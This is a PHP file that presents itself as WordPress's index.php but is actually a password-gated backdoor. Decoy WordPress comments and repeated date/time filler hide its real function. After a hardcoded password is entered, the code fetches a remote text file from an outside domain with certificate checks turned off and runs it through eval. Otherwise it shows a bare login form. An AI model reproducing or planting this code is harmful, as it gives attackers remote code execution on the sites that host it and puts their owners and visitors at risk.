<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
session_start();
function geturlsinfo($url) {
    if (function_exists('curl_exec')) 
 /*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
* Function to get URL contents using cURL
*/{
$conn = curl_init($url);
curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Firefox/32.0");
// Set cookies using session if available
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 */
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
// Set cookies using session if available
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 */
// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
if (isset($_SESSION['coki'])) {
    curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
}
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format
// Set the default timezone to your preferred timezone
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 */
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 *
 */
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } else {
        $url_get_contents_data = file_get_contents($url);
    }
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 *
 */
    return $url_get_contents_data;
}
// Function to check if the user is logged in
function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}
// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format
// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 */
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
$correct_password = 't@bOe!8Y#xF3Q2$gVz%pA^w4R&nL6D1*ZsJ0~+Mk@rX^7mL!5u2$w3Y#zA1!qN6&tB*8';
if ($entered_password === $correct_password) {
        // Password is correct, store it in session
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 */
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    }
}
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
if (is_logged_in()) {
    $a = geturlsinfo('https://utama.dinokuning.lat/cgi2.txt');
    eval('?>' . $a);
} else {
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 *
 */
/*** Front to the WordPress application. This filedoesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 * wp-blog-header.php which does and tells WordPress to load the theme.
 */
/** wp-blog-header.php which does and tells WordPress to load the theme.
 */
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
// Set the default timezone to your preferred timezone
?><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="https://utama.dinokuning.lat/scriptjs/pypz.css"></head><body><div class="login-container"><form method="POST" action=""><input type="password" id="password" name="password" required><input type="submit" value="Sign in"></form></div></body></html><?php /** /*** Front to the WordPress application. This filedoesn't do anything, but loads * wp-blog-header.php which does and tells WordPress to load the theme. * Tells WordPress to load the WordPress theme and output it. // Additional functionality: Check if the current time is within a specific range * Front to the WordPress application. This file doesn't do anything, but loads /*** Front to the WordPress application.
*/
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
date_default_timezone_set('Your/Timezone');
// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 */
/**
 */
// Set the default timezone to your preferred timezone
/**
 * Function to get URL contents using cURL
 */
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// Get the current date and time in various formats
}
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}

// Additional functionality: Check if it's Monday or Friday
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// The script runs all the logic but does not output anything to the browser.

// Set the default timezone to your preferred timezone
date_default_timezone_set('Your/Timezone');

// Get the current date and time in various formats
$currentDate = date('Y-m-d');               // Format: YYYY-MM-DD
$currentTime = date('H:i:s');               // Format: HH:MM:SS (24-hour format)
$dayOfWeek = date('l');                     // Day of the week, e.g., 'Monday'
$fullDateTime = date('l, F j, Y, g:i A');   // Full date and time with day, month name, and 12-hour format

// Additional functionality: Check if the current time is within a specific range
$startTime = "09:00:00";  // Start time in 24-hour format
$endTime = "17:00:00";    // End time in 24-hour format

if ($currentTime >= $startTime && $currentTime <= $endTime) {
    $withinWorkingHours = true;
} else {
    $withinWorkingHours = false;
}
$isMonday = ($dayOfWeek == 'Monday');
$isFriday = ($dayOfWeek == 'Friday');

// Get the current date and time in various formats
?>
